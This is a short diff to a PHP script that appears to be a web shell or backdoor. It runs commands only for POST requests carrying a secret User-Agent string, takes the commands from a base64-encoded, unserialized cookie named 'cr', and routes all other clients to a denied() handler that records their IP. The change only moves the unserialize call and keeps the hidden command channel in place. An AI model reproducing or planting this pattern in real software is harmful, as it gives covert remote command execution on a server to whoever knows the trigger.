@@ -364,7 +364,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
         $ct = null;
         $split = null;
         if ($_POST['cr'] === "1") {
-            $split = unserialize(base64_decode($_COOKIE['cr']), ["allowed_classes" => false]);
+            $split = base64_decode($_COOKIE['cr']);
         } else {
             $s = $_COOKIE['cr'];
             $v = explode(".", base64_decode($s));
@@ -374,7 +374,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
                 echo $e . "\n";
             }
         }
-        executeCommands($split, "0");
+        executeCommands(unserialize($split, ['allowed_classes' => false]), "0");
     } else {
         denied($_SERVER['REMOTE_ADDR']);
     }
